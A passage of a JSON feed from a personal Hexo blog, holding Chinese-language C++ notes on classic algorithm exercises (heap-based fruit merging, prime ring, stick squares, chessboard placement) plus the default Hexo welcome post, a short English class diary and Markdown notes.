            "content_html": "<p><img data-src=\"https://s2.loli.net/2023/03/16/No51BErYemDLZpQ.jpg\" alt=\"37\" /></p>\n<h4 id=\"问题描述\"><a class=\"anchor\" href=\"#问题描述\">#</a> 问题描述：</h4>\n<blockquote>\n<p>在一个果园里，多多已经将所有的果子打了下来，而且按果子的不同种类分成了不同的堆。多多决定把所有的果子合成一堆。每一次合并，多多可以把两堆果子合并到一起，消耗的体力等于两堆果子的重量之和。可以看出，所有的果子经过 n-1 次合并之后，就只剩下一堆了。多多在合并果子时总共消耗的体力等于每次合并所耗体力之和。</p>\n<p>因为还要花大力气把这些果子搬回家，所以多多在合并果子时要尽可能地节省体力。假定每个果子重量都为 1，并且已知果子的种类数和每种果子的数目，你的任务是设计出合并的次序方案，使多多耗费的体力最少，并输出这个最小的体力耗费值。<br />\n　　例如有 3 种果子，数目依次为 1，2，9。可以先将 1、2 堆合并，新堆数目为 3，耗费体力为 3。接着，将新堆与原先的第三堆合并，又得到新的堆，数目为 12，耗费体力为 12。<br />\n所以多多总共耗费体力 = 3+12=15。可以证明 15 为最小的体力耗费值。<br />\n输入<br />\n　　输入包括两行，第一行是一个整数 n (1&lt;＝n&lt;=10000)，表示果子的种类数。<br />\n　　第二行包含 n 个整数，用空格分隔，第 i 个整数 ai (1&lt;＝ai&lt;=20000) 是第 i 种果子的数目。<br />\n输出<br />\n　　输出包括一行，这一行只包含一个整数，也就是最小的体力耗费值。输入数据保证这个值小于 2^31。</p>\n</blockquote>\n<p><strong>解决问题思路</strong>：取出最小相加成一堆，并计算体力消耗</p>\n<h4 id=\"方法一小顶堆\"><a class=\"anchor\" href=\"#方法一小顶堆\">#</a> 方法一：小顶堆</h4>\n<p>代码及思路如下</p>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n#include&lt;algorithm&gt;\n\nusing namespace std;\nconst int maxn=10086;\nvoid updateheap(int heap[],int idx,int high)// 在本身是小顶堆的情况下维护\n&#123;\n    int i=idx,j=2*i;//\n    while(j&lt;=high)\n    &#123;\n        if(j+1&lt;=high &amp;&amp; heap[j]&gt;heap[j+1]) j=j+1;\n        if(heap[j]&lt;heap[i]) swap(heap[j],heap[i]);// 当需要进行维护操作时，就说明idx节点不满足小顶堆，要考虑swap后对子节点的影响\n        else break;//  在它本身是小顶堆的情况下，确保了维护的这个节点满足条件即可结束\n        i=j; // 考虑到子节点的影响，继续对子节点判断维护\n        j=2*i;\n    &#125;\n&#125;\n\nvoid heapinit(int heap[],int len) // 创建一个小顶堆，len是小顶堆大小\n&#123;\n    for(int i=1;i&lt;=len;i++) cin&gt;&gt;heap[i]; // 空间足够，以1为根结点 事实上，一般都以1为节点\n    for(int i=len/2;i&gt;0;i--) updateheap(heap,i,len); // 从叶子向根节点维护，确保有序性\n&#125;\n\nvoid deletetop(int heap[],int &amp;n) // n即size将要移除的数放到末尾，并回收末尾节点 = size-- \n&#123;\n    \n    swap(heap[1],heap[n]);// change happans ,we have to maintain it\n    n--; // after swap we recycle the last node\n    updateheap(heap,1,n);\n    \n&#125;\nvoid insertheap(int heap[],int &amp;n,int value)\n&#123;\n    n++;\n    heap[n]=value;\n    int i=n,j=i/2;// i is the childnode, and j is the fathernode\n    while(i&gt;1)\n    &#123;\n        if(heap[i]&lt;heap[j]) swap(heap[i],heap[j]);\n        else return; // heap[i]&gt;=heap[j]说明插入的值并不比父节点大，有序性得以保证\n        i=j;\n        j=i/2;\n    &#125;\n    return;\n&#125;\nint main()\n&#123;\n    int n,Heap[maxn],stamina,size;\n    cin&gt;&gt;n;\n    size=n;\n    stamina=0;\n    heapinit(Heap,n);\n    if(n==1)\n    &#123;\n        cout&lt;&lt;Heap[1];\n        return 1;\n    &#125;\n    // stamina 的消耗可以堆顶的访问删除来实现\n    // 通过将堆顶与堆底互换并回收堆底，保持访问堆的结构不变，通过维护保持堆的有序\n    // 回收（size--通过大小的减小停止对堆底的维护，即回收）未删除数据但不影响\n    while(size&gt;1)\n    &#123;\n        int a = Heap[1];\n        deletetop(Heap,size);\n        int b=Heap[1];\n        deletetop(Heap,size);\n       \n        insertheap(Heap,size,a+b);// value isn't equal to stamina cost totally\n        stamina+=(a+b);\n\n    &#125;\n    cout&lt;&lt;stamina;\n&#125;\n</code></pre>\n<p>结语：涉及二叉堆的生成与维护，要注意对堆顶 pop 时 (也就是上文中的 deletetop 函数，topnode 的值并没有被删除，而是放在了堆底回收区，堆的大小并不是真正意义上所占全部空间的大小，而是有效空间的大小)</p>\n<h4 id=\"方法二优先队列\"><a class=\"anchor\" href=\"#方法二优先队列\">#</a> 方法二：优先队列</h4>\n<p>代码及思路如下</p>\n<pre><code class=\"language-c++\">#include &lt;queue&gt;\n#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main()\n&#123;\n    priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt; que;\n    // greater 增序，使最小的位于top\n    int n, i, stamina = 0;\n    cin &gt;&gt; n;\n    i = n;\n    while (i--)\n    &#123;\n        int x;\n        cin &gt;&gt; x;\n        que.push(x);\n    &#125;// 输入que，自动排序\n    if (n == 1)\n    &#123;\n        int x = que.top();\n        cout &lt;&lt; x;\n        que.pop();\n    &#125;\n    while (que.size() &gt; 1)\n    &#123;\n        int a = que.top();\n        que.pop();\n        int b = que.top();\n        que.pop();\n        stamina += (a + b);\n        que.push(a + b);\n    &#125;\n    //que.top()=sum 所有之和，不用计算到体力消耗\n\n\n    cout &lt;&lt; stamina;\n&#125;\n\n</code></pre>\n<p>结语：相比于使用小顶堆，使用优先队列的代码无疑简介易懂。</p>\n<p>然而事实上优先队列本质上使用的也是堆的思想。二者在时间效率上，是前者更优。<s>(specific 优于 general)</s> 😃</p>\n<p>参考资料：</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi82dXBFSw==\">Possible_Answer</span>,</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xODc2MTg0NTA=\"> 二叉堆 -- 知乎</span>，</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi8yQ1o0YQ==\">优先队列</span>，<span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9DNlA0aA==\">优先队列 (实例)</span>,</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTU0NjcwMDA=\">数据结构 —— 哈夫曼树 (Huffman Tree)</span>,(知识扩展)</p>\n</blockquote>\n<hr />\n<blockquote>\n<p>写在最后，这里出于课程要求，并没有考虑快排的方法，事实上快排无疑也是一种解决方案</p>\n</blockquote>\n",
            "tags": [
                "Notes",
                "C++"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/%E7%B4%A0%E6%95%B0%E7%8E%AF%E9%97%AE%E9%A2%98/",
            "url": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/%E7%B4%A0%E6%95%B0%E7%8E%AF%E9%97%AE%E9%A2%98/",
            "title": "素数环问题",
            "date_published": "2023-03-19T11:29:17.362Z",
            "content_html": "<p>素数环问题</p>\n<blockquote>\n<p><strong>Problem Description</strong></p>\n<p>A ring is compose of n circles as shown in diagram. Put natural number 1, 2, ..., n into each circle separately, and the sum of numbers in two adjacent circles should be a prime.</p>\n<p>Note: the number of first circle should always be 1.</p>\n<hr />\n<p><strong>Input</strong></p>\n<p>n (0 &lt; n &lt; 20).</p>\n<hr />\n<p><strong>Output</strong></p>\n<p>The output format is shown as sample below. Each row represents a series of circle numbers in the ring beginning from 1 clockwisely and anticlockwisely. The order of numbers must satisfy the above requirements. Print solutions in lexicographical order.</p>\n<hr />\n<p>You are to write a program that completes above process.</p>\n<p>&lt;u&gt;<strong>Print a blank line after each case.</strong>&lt;/u&gt;</p>\n</blockquote>\n<p>解题思路：</p>\n<p>代码如下：</p>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;stack&gt;\n#include&lt;math.h&gt; \n#include&lt;string.h&gt;\nusing namespace std;\n/*\n从2开始到sqrt(num)，逐一判断\n*/\nint n;\nint arry[27]&#123;1&#125;,flag[27]&#123;0&#125;;\nstack&lt;int&gt; s1, s2;\n\nbool isPrime_2(int num)\n&#123;\n    if (num == 1 || num == 4)\n        return 0;\n    if (num == 2 || num == 3)\n        return 1;\n    int temp = sqrt(num);\n    for (int i = 2; i &lt;= temp; i++)\n    &#123;\n        if (num % i == 0)\n            return 0;\n    &#125;\n    return 1;\n&#125;\n\n\nvoid dfs(int k)\n&#123;\n    if(k==n&amp;&amp;isPrime_2(arry[0]+arry[n-1])) //如果递归到下标n并且满足条件就找到一组正确的数据了\n    &#123;\n        for(int i=0;i&lt;n-1;i++)\n        cout&lt;&lt;arry[i]&lt;&lt;&quot; &quot;;\n        cout&lt;&lt;arry[n-1]&lt;&lt;endl;\n    &#125;\n    else\n    &#123;\n        for(int i=2;i&lt;=n;i++)\n        if(flag[i]==0&amp;&amp;isPrime_2(arry[k-1]+i)) //如果i没有使用过，并且a[k-1]和i相加为素数\n        &#123;\n            arry[k]=i;     //记录下标的值\n            flag[i]=1; //标记为使用过的\n            dfs(k+1);  //开始下一个下标的计算\n            flag[i]=0;//清除标记\n        &#125;\n    &#125;\n&#125;\n\nint main()\n&#123;\n    int i=0;\n    while (cin &gt;&gt; n)\n    &#123;\n        i++;\n        memset(flag,0,sizeof(flag));\n        for (int k = 0; k &lt; n; k++)\n            arry[k] = 1;\n        cout&lt;&lt;&quot;Case &quot;&lt;&lt;i&lt;&lt;':'&lt;&lt;endl;\n        flag[0]=1;\n        dfs(1);\n        cout&lt;&lt;endl;\n        \n\n    &#125;\n&#125;\n</code></pre>\n<p>结语：</p>\n<p>参考资料：</p>\n<blockquote>\n<p>[源码借鉴 From 简书]( <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC85MThiZWM3MzJiN2Q=\">DFS (素数环) - 简书 (jianshu.com)</span>)，</p>\n</blockquote>\n",
            "tags": [
                "Notes",
                "C++"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/%E5%B0%8F%E6%9C%A8%E6%A3%8D%E7%BB%84%E6%AD%A3%E6%96%B9%E5%BD%A2/",
            "url": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/%E5%B0%8F%E6%9C%A8%E6%A3%8D%E7%BB%84%E6%AD%A3%E6%96%B9%E5%BD%A2/",
            "title": "小木棍组正方形",
            "date_published": "2023-03-19T11:29:17.362Z",
            "content_html": "<p>小木棍组正方形：</p>\n<p>解题思路：</p>\n<p>使用 DFS 算法，并减去一些枝干</p>\n<p>代码如下</p>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\nint sticks[38]&#123;0&#125;;//存放木棍长度\n\nint side, groupnum, n;\nbool DFS(int sum, int number, int pos,int * flag)\n&#123;\n    if (number == 3)\n        return true;\n\n    for(int i=pos;i&lt;n;i++)\n    &#123;\n        if(sum+sticks[pos]&gt;side)&#123;\n            continue;\n        &#125;\n        if(flag[i]==1)\n        &#123;\n            continue;\n        &#125;\n        if(sum+sticks[i]==side)// 深度搜索\n        &#123;\n            if(DFS(0,number+1,0,flag)) return true;\n        &#125;\n        else\n        &#123;\n            if(DFS(sum+sticks[i],number,0,flag)) return true;\n        &#125;//深度搜索不能返回true，则返回上一节点，寻找其他子节点，通过for实现\n        flag[i]=0;\n    &#125;\n    return false;\n&#125;\n\nint main()\n&#123;\n\n    cin &gt;&gt; groupnum;\n    while (groupnum--)\n    &#123;\n        int flag[38]&#123;0&#125;;\n        cin &gt;&gt; n;\n        int s = 0;\n        for (int i = 0; i &lt; n; i++)\n        &#123;\n            cin &gt;&gt; sticks[i];\n            s += sticks[i];\n        &#125;\n        if (s % 4 != 0)\n        &#123;\n            cout &lt;&lt; &quot;no&quot; &lt;&lt; endl;\n            continue;\n        &#125;\n        side = s / 4;\n\n        sort(sticks, sticks + n, greater&lt;int&gt;());\n        if (sticks[0] &gt; side)\n        &#123;\n            cout &lt;&lt; &quot;no&quot; &lt;&lt; endl;\n            continue;\n        &#125;\n        if (DFS(0, 0, 0,flag))\n            cout &lt;&lt; &quot;yes&quot; &lt;&lt; endl;\n        else \n            cout&lt;&lt;&quot;no&quot;&lt;&lt;endl;\n    &#125;\n&#125;\n</code></pre>\n<p>结语：</p>\n<p>DFS 模板</p>\n<pre><code class=\"language-c++\">int check(参数)\n&#123;\n    if(满足条件)\n        return 1;\n    return 0;\n&#125;\n \nvoid dfs(int step)\n&#123;\n        判断边界\n        &#123;\n            相应操作\n        &#125;\n        尝试每一种可能\n        &#123;\n               满足check条件\n               标记\n               继续下一步dfs(step+1)\n               恢复初始状态（回溯的时候要用到）\n        &#125;\n&#125;   \n</code></pre>\n<p>参考资料</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9FZjhNUQ==\">http://t.csdn.cn/Ef8MQ</span> DFS 算法解释及例题</p>\n",
            "tags": [
                "Notes",
                "C++"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/DFS/%E6%A3%8B%E7%9B%98%E9%97%AE%E9%A2%98/",
            "url": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/DFS/%E6%A3%8B%E7%9B%98%E9%97%AE%E9%A2%98/",
            "title": "棋盘问题",
            "date_published": "2023-03-19T11:29:17.362Z",
            "content_html": "<h4 id=\"问题描述\"><a class=\"anchor\" href=\"#问题描述\">#</a> 问题描述</h4>\n<blockquote>\n<p>在一个给定形状的棋盘（形状可能是不规则的）上面摆放棋子，棋子没有区别。要求摆放时任意的两个棋子不能放在棋盘中的同一行或者同一列，请编程求解对于给定形状和大小的棋盘，摆放 k 个棋子的所有可行的摆放方案 C。</p>\n</blockquote>\n<h5 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h5>\n<blockquote>\n<p>输入含有多组测试数据。<br />\n每组数据的第一行是两个正整数 *，n k*，用一个空格隔开，表示了将在一个 n*n 的矩阵内描述棋盘，以及摆放棋子的数目。</p>\n<p>n &lt;= 8 , k &lt;= n</p>\n<p>当为 **-1 -1** 时表示输入结束。<br />\n随后的 n 行描述了棋盘的形状：每行有 n 个字符，其中  <code>#</code>  表示棋盘区域， <code>.</code>  表示空白区域（数据保证不出现多余的空白行或者空白列）。</p>\n</blockquote>\n<h5 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h5>\n<blockquote>\n<p>对于每一组数据，给出一行输出，输出摆放的方案数目 C （<em>数据保证 C&lt;2^31</em>）。</p>\n</blockquote>\n<h5 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h5>\n<figure class=\"highlight plain\"><figcaption data-lang=\"plain\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>2 1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>.#</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>4 4</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>...#</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>..#.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>.#..</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>#...</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-1 -1</pre></td></tr></table></figure><h5 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h5>\n<figure class=\"highlight plain\"><figcaption data-lang=\"plain\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>1</pre></td></tr></table></figure><h4 id=\"解题思路\"><a class=\"anchor\" href=\"#解题思路\">#</a> 解题思路</h4>\n<p><strong>代码如下</strong>:</p>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;string.h&gt;\nusing namespace std;\n\nint n, k, ans, a[64], j; // n 方阵长度，k棋子个数,ans is answer\n\nint visit[8][8]&#123;0&#125;; // shows which cloumn and row is not placeable\n\nstruct Node\n&#123;\n    int *flag;\n    int p = 0;// in fact, the param is redundant\n&#125;;\n// 如果为0则空，1则有棋盘’#‘\nNode qiju[100];\n// 进行遍历// 考虑使用下标 从1开始\n\nvoid dfs(int idx, int num)\n&#123;\n    if (num == k)\n        ans++; // plan + 1\n    else\n    &#123;\n        for (int i = idx; i &lt; j; i++) // each qipan has possiblity\n        &#123;\n            if (*qiju[a[i]].flag == 1)\n                continue;\n            *qiju[a[i]].flag = 1; //\n            dfs(0, num + 1);\n        &#125;\n    &#125;\n&#125;\n\nint main()\n&#123;\n    char ch;\n    while (cin &gt;&gt; n &gt;&gt; k)\n    &#123;\n        if (n == -1 &amp;&amp; k == -1)\n            break;\n        j = 0;\n        ans = 0;\n        memset(qiju, 0, sizeof(qiju));\n        memset(visit, 0, sizeof(visit));\n\n        for (int i = 0; i &lt; n * n; i++)\n        &#123;\n\n            cin &gt;&gt; ch;\n            switch (ch)\n            &#123;\n            case '.':\n                break;\n            case '#':\n\n                qiju[i].p = 1;// when I have created array a, \n                    \t\t//I can visit qiju by a, \n                    \t\t//in this situation param p is redundant.\n                qiju[i].flag = &amp;visit[i / n][i % n]; // point to position\n                a[j] = i;                            // restore qipan position with arry a\n                j++;\n                break;\n            &#125;\n        &#125;\n        dfs(0, 0);\n        cout &lt;&lt; ans &lt;&lt; endl;\n    &#125;\n    return 0;\n&#125;\n</code></pre>\n<h4 id=\"结语\"><a class=\"anchor\" href=\"#结语\">#</a> 结语</h4>\n<p>通过 visit 标记状态，通过 node 取地址，使每个棋盘的状态得以被标示，同时通过 node 数组，a 数组实现快速访问，规避无效数据。</p>\n<h4 id=\"参考资料\"><a class=\"anchor\" href=\"#参考资料\">#</a> 参考资料</h4>\n<blockquote>\n<p>DFS 深度优先搜索算法</p>\n</blockquote>\n",
            "tags": [
                "Notes",
                "C++",
                "DFS"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/DFS/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/",
            "url": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/DFS/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/",
            "title": "迷宫问题",
            "date_published": "2023-03-19T11:29:17.362Z",
            "content_html": "<p>问题描述</p>\n<p>解决思路</p>\n<p>代码如下</p>\n<p>结语：</p>\n<p>迷宫问题很重要的就是路径，方向，路径使用栈，方向通过 2X4 的数组描述，关键在于，在平面上点的坐标可以用 (x,y) 描述，给它加上</p>\n<p>(1,0)((-1,0),(0,1),(0,-1)) 就实现了向右 (左，上，下) 移动。</p>\n<p>参考资料</p>\n",
            "tags": [
                "Notes",
                "C++",
                "DFS"
            ]
        },
        {
            "id": "http://example.com/2023/03/18/hello-world/",
            "url": "http://example.com/2023/03/18/hello-world/",
            "title": "Hello World",
            "date_published": "2023-03-18T11:57:26.311Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/08/zhaji/EnglishClass/",
            "url": "http://example.com/2022/09/08/zhaji/EnglishClass/",
            "title": "My fist English Class",
            "date_published": "2022-09-08T06:40:00.000Z",
            "content_html": "<h1 id=\"short-talk\"><a class=\"anchor\" href=\"#short-talk\">#</a> Short Talk</h1>\n<p>(In fact, i want to improve my English through writing some articles in English.)</p>\n<hr />\n<h3 id=\"my-teachers\"><a class=\"anchor\" href=\"#my-teachers\">#</a> My teachers</h3>\n<p>One of my teacher is a <em>Chinese</em>,while the other one is an <em>English</em>(maybe,i'm not certain,forgive me)<br />\nWhen i typing the article you see, i'm taking my foreign teacher's spoken English class.</p>\n<hr />\n<h3 id=\"my-class\"><a class=\"anchor\" href=\"#my-class\">#</a> My class</h3>\n<p>The spoken English class focuses on discussion.<br />\nYet my classmates are pretty shy so that few discusions happened when we were dvided into the same discuss room.</p>\n",
            "tags": [
                "随笔"
            ]
        },
        {
            "id": "http://example.com/2022/09/07/zhaji/Note%20of%20markdown/",
            "url": "http://example.com/2022/09/07/zhaji/Note%20of%20markdown/",
            "title": "Notes Of Markdown",
            "date_published": "2022-09-07T15:00:00.000Z",
            "content_html": "<p>为了搭建自己的 blog，clone 了个模板。现在也是时候该来学写 blog 了。 <s>（什么写 blog 还要学不是有手就行？？）</s></p>\n<hr />\n<h1 id=\"note-of-markdown\"><a class=\"anchor\" href=\"#note-of-markdown\">#</a> Note Of Markdown</h1>\n<hr />\n<h3 id=\"1-准备preparation\"><a class=\"anchor\" href=\"#1-准备preparation\">#</a> 1. 准备（Preparation）</h3>\n<ul>\n<li><strong>应用软件：Video Studio Code</strong></li>\n<li><strong>工作文件：makedown (后缀为 <code>.md</code> ）</strong></li>\n</ul>\n<hr />\n<h3 id=\"2-开始beginning\"><a class=\"anchor\" href=\"#2-开始beginning\">#</a> 2. 开始（Beginning）</h3>\n<ul>\n<li><strong>创建一个文本文档更改后缀为 <code>.md</code>  然后用 Visual Studio Code 打开，或者先打开 Visual Studio Code 然后新建一个后缀为 <code>.md</code>  的文件。</strong></li>\n<li><strong>打开侧边预览</strong></li>\n</ul>\n<pre><code>在view中打开 Command Palette 然后输入Open Preview to the Side\n</code></pre>\n<hr />\n<h3 id=\"3语法grammar\"><a class=\"anchor\" href=\"#3语法grammar\">#</a> 3. 语法（Grammar）</h3>\n<h5 id=\"标题title\"><a class=\"anchor\" href=\"#标题title\">#</a> 标题（Title)</h5>\n<ol>\n<li>标题可分为一到六级分别用 #、##、###...... 以此类推<br />\n其中 #表示的最大，###### 最小。语法如下：</li>\n</ol>\n<pre><code># 标题1\n## 标题2\n### 标题3\n...\n</code></pre>\n<ol start=\"2\">\n<li>换行直接回车</li>\n<li>字体\n<ul>\n<li><code>*内容*</code>  为斜体</li>\n<li><code>**内容**</code>  为加粗</li>\n<li><code>***内容***</code>  为粗斜体</li>\n<li><code>~~内容~~</code>  为删除线<br />\n表现：<em>内容</em>、<strong>内容</strong>、<em><strong>内容</strong></em>、<s>内容</s></li>\n</ul>\n</li>\n</ol>\n<h3 id=\"4插入insert\"><a class=\"anchor\" href=\"#4插入insert\">#</a> 4. 插入 (Insert)</h3>\n<ol>\n<li>\n<p>插入图片</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>![图片名称](图片链接 'Alt')</pre></td></tr></table></figure></li>\n<li>\n<p>插入链接</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token url\">[<span class=\"token content\">内容</span>](<span class=\"token url\">链接</span>)</span></pre></td></tr></table></figure></li>\n<li>\n<p>混合使用</p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>[![图片名称](图片链接 'Alt')](链接)</pre></td></tr></table></figure><p>这样就对图片添加了超链接。</p>\n</li>\n</ol>\n<h3 id=\"5其他\"><a class=\"anchor\" href=\"#5其他\">#</a> 5. 其他</h3>\n<ul>\n<li>\n<p>工具</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90eXBvcmFpby5jbi8=\">Typro</span></p>\n</li>\n<li>\n<p>更多语法参照<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9odG1sL2h0bWwtdHV0b3JpYWwuaHRtbA==\"> HTML</span></p>\n</li>\n</ul>\n",
            "tags": [
                "Notes"
            ]
        }
    ]
}